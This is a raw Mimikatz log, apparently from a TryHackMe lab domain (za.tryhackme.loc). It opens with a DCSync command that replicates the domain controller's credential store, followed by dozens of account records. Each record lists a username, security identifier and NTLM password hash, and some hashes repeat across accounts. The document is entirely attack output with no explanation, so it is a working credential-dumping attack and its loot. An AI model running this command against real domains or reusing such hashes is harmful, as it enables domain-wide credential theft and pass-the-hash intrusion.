Using 'lorraine.gill_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] Exporting domain 'za.tryhackme.loc'
[rpc] Service  : ldap
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1136
Object Relative ID   : 1136

Credentials:
  Hash NTLM: 8c256c99966686e52d3f34435a0e4262

Object RDN           : michael.cameron

** SAM ACCOUNT **

SAM Username         : michael.cameron
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1137
Object Relative ID   : 1137

Credentials:
  Hash NTLM: a4471e3c5e19e75e918f8f2329cd96b3

Object RDN           : nicholas.pearson

** SAM ACCOUNT **

SAM Username         : nicholas.pearson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1138
Object Relative ID   : 1138

Credentials:
  Hash NTLM: 35be61054cd9169e0f2b156ebbff549b

Object RDN           : georgia.cross

** SAM ACCOUNT **

SAM Username         : georgia.cross
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1139
Object Relative ID   : 1139

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : justin.barnes

** SAM ACCOUNT **

SAM Username         : justin.barnes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1140
Object Relative ID   : 1140

Credentials:
  Hash NTLM: 662817d16bd399a633cc327f7bf7ad9c

Object RDN           : tony.wilson

** SAM ACCOUNT **

SAM Username         : tony.wilson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1141
Object Relative ID   : 1141

Credentials:
  Hash NTLM: 4eda98f4d7730aa0e2284696d917af1a

Object RDN           : max.smith

** SAM ACCOUNT **

SAM Username         : max.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1142
Object Relative ID   : 1142

Credentials:
  Hash NTLM: 7df5f9e5d75b16cc454b1362ea798b42

Object RDN           : mandy.anderson

** SAM ACCOUNT **

SAM Username         : mandy.anderson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1143
Object Relative ID   : 1143

Credentials:
  Hash NTLM: cca456734c914dae50048217ad973646

Object RDN           : jack.hussain

** SAM ACCOUNT **

SAM Username         : jack.hussain
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1144
Object Relative ID   : 1144

Credentials:
  Hash NTLM: 4f2311c5170e79f961995650c06acc71

Object RDN           : amy.king

** SAM ACCOUNT **

SAM Username         : amy.king
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1145
Object Relative ID   : 1145

Credentials:
  Hash NTLM: 18b231aa08a76397446ad0f00c69e541

Object RDN           : lauren.oconnor

** SAM ACCOUNT **

SAM Username         : lauren.oconnor
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1146
Object Relative ID   : 1146

Credentials:
  Hash NTLM: 5094d4e9e9b58e3a94f30aa5ab15492c

Object RDN           : derek.ellis

** SAM ACCOUNT **

SAM Username         : derek.ellis
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1147
Object Relative ID   : 1147

Credentials:
  Hash NTLM: 75176876b49eadccfe59b2f1e38c4bf1

Object RDN           : sharon.khan

** SAM ACCOUNT **

SAM Username         : sharon.khan
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1148
Object Relative ID   : 1148

Credentials:
  Hash NTLM: fda69d63ad057ab6708bea0886635c2d

Object RDN           : alice.howard

** SAM ACCOUNT **

SAM Username         : alice.howard
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1149
Object Relative ID   : 1149

Credentials:
  Hash NTLM: d14c442325328cee6a299d699b638b22

Object RDN           : donald.ross

** SAM ACCOUNT **

SAM Username         : donald.ross
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1150
Object Relative ID   : 1150

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : frances.armstrong

** SAM ACCOUNT **

SAM Username         : frances.armstrong
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1151
Object Relative ID   : 1151

Credentials:
  Hash NTLM: 66f02947eace24a6bfb7def52f57e169

Object RDN           : vanessa.austin

** SAM ACCOUNT **

SAM Username         : vanessa.austin
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1152
Object Relative ID   : 1152

Credentials:
  Hash NTLM: 50156238463cd9c49b613edba74b2c14

Object RDN           : stephen.roberts

** SAM ACCOUNT **

SAM Username         : stephen.roberts
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1153
Object Relative ID   : 1153

Credentials:
  Hash NTLM: 243e0c1b8450075d42a4c81892365252

Object RDN           : christopher.smith

** SAM ACCOUNT **

SAM Username         : christopher.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1154
Object Relative ID   : 1154

Credentials:
  Hash NTLM: cbce1c80aca55dc11d8c5d70dc78000b

Object RDN           : wayne.garner

** SAM ACCOUNT **

SAM Username         : wayne.garner
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1155
Object Relative ID   : 1155

Credentials:
  Hash NTLM: fa0785b0151039736e8a9dbe49d167d7

Object RDN           : william.white

** SAM ACCOUNT **

SAM Username         : william.white
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1156
Object Relative ID   : 1156

Credentials:
  Hash NTLM: 481b73e059b565ce87a96c116faaab87

Object RDN           : hannah.williams

** SAM ACCOUNT **

SAM Username         : hannah.williams
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1157
Object Relative ID   : 1157

Credentials:
  Hash NTLM: 23713cf6439b0ed005565cc8046e255e

Object RDN           : kevin.perry

** SAM ACCOUNT **

SAM Username         : kevin.perry
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1158
Object Relative ID   : 1158

Credentials:
  Hash NTLM: 49e5e3cd55cc99353d8402dc2ed336f2

Object RDN           : graeme.ryan

** SAM ACCOUNT **

SAM Username         : graeme.ryan
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1159
Object Relative ID   : 1159

Credentials:
  Hash NTLM: 4a5668b043f0c9f06540fa2efcd9608c

Object RDN           : valerie.ford

** SAM ACCOUNT **

SAM Username         : valerie.ford
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1160
Object Relative ID   : 1160

Credentials:
  Hash NTLM: d14f109049e62f131f3642855ff0fed7

Object RDN           : antony.ross

** SAM ACCOUNT **

SAM Username         : antony.ross
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1161
Object Relative ID   : 1161

Credentials:
  Hash NTLM: c44ba85d1c22a34517874e661a40700b

Object RDN           : stacey.green

** SAM ACCOUNT **

SAM Username         : stacey.green
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1162
Object Relative ID   : 1162

Credentials:
  Hash NTLM: 366ce5a95372a47a5b87e1fac5fc5cc5

Object RDN           : jason.jackson

** SAM ACCOUNT **

SAM Username         : jason.jackson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1163
Object Relative ID   : 1163

Credentials:
  Hash NTLM: 7f57a40f81bfa865333b624c7a4d64a7

Object RDN           : frederick.banks

** SAM ACCOUNT **

SAM Username         : frederick.banks
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1164
Object Relative ID   : 1164

Credentials:
  Hash NTLM: 5e807d66a0b0a8dc85cc341499aad372

Object RDN           : leon.hobbs

** SAM ACCOUNT **

SAM Username         : leon.hobbs
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1165
Object Relative ID   : 1165

Credentials:
  Hash NTLM: 1e3fe4abe3975ac7cb1bc3131d1edc4a

Object RDN           : charlene.thomas

** SAM ACCOUNT **

SAM Username         : charlene.thomas
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1166
Object Relative ID   : 1166

Credentials:
  Hash NTLM: bedcef27706a703a8474342193bd3c14

Object RDN           : linda.pugh

** SAM ACCOUNT **

SAM Username         : linda.pugh
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1167
Object Relative ID   : 1167

Credentials:
  Hash NTLM: c18902ea605c76fba42f91fe0f2db655

Object RDN           : claire.nicholson

** SAM ACCOUNT **

SAM Username         : claire.nicholson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1168
Object Relative ID   : 1168

Credentials:
  Hash NTLM: d0c250a5ec66e20b4f1c77e8d02a0e78

Object RDN           : brenda.fowler

** SAM ACCOUNT **

SAM Username         : brenda.fowler
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1169
Object Relative ID   : 1169

Credentials:
  Hash NTLM: 1ee73fdf98d61ba3236225aaf352c1c9

Object RDN           : melissa.parsons

** SAM ACCOUNT **

SAM Username         : melissa.parsons
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1170
Object Relative ID   : 1170

Credentials:
  Hash NTLM: 22ccdebbc4fcfc0ffcfb6e56e5046f17

Object RDN           : jennifer.green

** SAM ACCOUNT **

SAM Username         : jennifer.green
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1171
Object Relative ID   : 1171

Credentials:
  Hash NTLM: 5ab6f97bf4c09cbc610db38f48dfa0e1

Object RDN           : anna.morgan

** SAM ACCOUNT **

SAM Username         : anna.morgan
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1172
Object Relative ID   : 1172

Credentials:
  Hash NTLM: 37d26c9c2ded1eaa9b4ddf45b8729442

Object RDN           : hannah.powell

** SAM ACCOUNT **

SAM Username         : hannah.powell
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1173
Object Relative ID   : 1173

Credentials:
  Hash NTLM: 36f8a95ee48d5d981b7b5c5e60d64d0d

Object RDN           : ann.peters

** SAM ACCOUNT **

SAM Username         : ann.peters
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1174
Object Relative ID   : 1174

Credentials:
  Hash NTLM: 36631194d2e0dc57b7151428d9136df1

Object RDN           : graeme.pearce

** SAM ACCOUNT **

SAM Username         : graeme.pearce
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1175
Object Relative ID   : 1175

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : justin.sheppard

** SAM ACCOUNT **

SAM Username         : justin.sheppard
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1176
Object Relative ID   : 1176

Credentials:
  Hash NTLM: f78f09e8abf9feae521ed5e2a365cab9

Object RDN           : arthur.holland

** SAM ACCOUNT **

SAM Username         : arthur.holland
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1177
Object Relative ID   : 1177

Credentials:
  Hash NTLM: 20f296bf3eda5a53999a8139a973882d

Object RDN           : carolyn.king

** SAM ACCOUNT **

SAM Username         : carolyn.king
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1178
Object Relative ID   : 1178

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : lynda.short

** SAM ACCOUNT **

SAM Username         : lynda.short
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1179
Object Relative ID   : 1179

Credentials:
  Hash NTLM: cd3e271eed91bee5f95e4eb9cdc10349

Object RDN           : roy.jones

** SAM ACCOUNT **

SAM Username         : roy.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1180
Object Relative ID   : 1180

Credentials:
  Hash NTLM: 955693bab5d153c73fa1443ec43518ef

Object RDN           : norman.hall

** SAM ACCOUNT **

SAM Username         : norman.hall
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1181
Object Relative ID   : 1181

Credentials:
  Hash NTLM: 1bf8b75e8a5563e30a932173795413ce

Object RDN           : irene.greenwood

** SAM ACCOUNT **

SAM Username         : irene.greenwood
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1182
Object Relative ID   : 1182

Credentials:
  Hash NTLM: a356c0cf3ae67293c1a05c32e77026a1

Object RDN           : kathleen.allen

** SAM ACCOUNT **

SAM Username         : kathleen.allen
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1183
Object Relative ID   : 1183

Credentials:
  Hash NTLM: 9e34f68fac9dc9a466a77d1d91d06be1

Object RDN           : gerard.taylor

** SAM ACCOUNT **

SAM Username         : gerard.taylor
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1184
Object Relative ID   : 1184

Credentials:
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b

Object RDN           : thomas.hunt

** SAM ACCOUNT **

SAM Username         : thomas.hunt
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1185
Object Relative ID   : 1185

Credentials:
  Hash NTLM: 643721ffd8c119ca17af410505929694

Object RDN           : jamie.ali

** SAM ACCOUNT **

SAM Username         : jamie.ali
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1186
Object Relative ID   : 1186

Credentials:
  Hash NTLM: 1b1a01903ae489d1d918082254d1ea83

Object RDN           : carly.hughes

** SAM ACCOUNT **

SAM Username         : carly.hughes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1187
Object Relative ID   : 1187

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : aimee.jones

** SAM ACCOUNT **

SAM Username         : aimee.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1188
Object Relative ID   : 1188

Credentials:
  Hash NTLM: 84a919b8c6c8b9720d4fdc92ae88e9dc

Object RDN           : mandy.lee

** SAM ACCOUNT **

SAM Username         : mandy.lee
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1189
Object Relative ID   : 1189

Credentials:
  Hash NTLM: ad05af63a95dff7b52280a8d87079d2a

Object RDN           : hannah.roberts

** SAM ACCOUNT **

SAM Username         : hannah.roberts
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1190
Object Relative ID   : 1190

Credentials:
  Hash NTLM: daacc521e9e4d694a626212df66429ce

Object RDN           : emma.baker

** SAM ACCOUNT **

SAM Username         : emma.baker
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1191
Object Relative ID   : 1191

Credentials:
  Hash NTLM: 1af331962bfc46bb3ffbb4c468e189d4

Object RDN           : helen.saunders

** SAM ACCOUNT **

SAM Username         : helen.saunders
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1192
Object Relative ID   : 1192

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : christian.dobson

** SAM ACCOUNT **
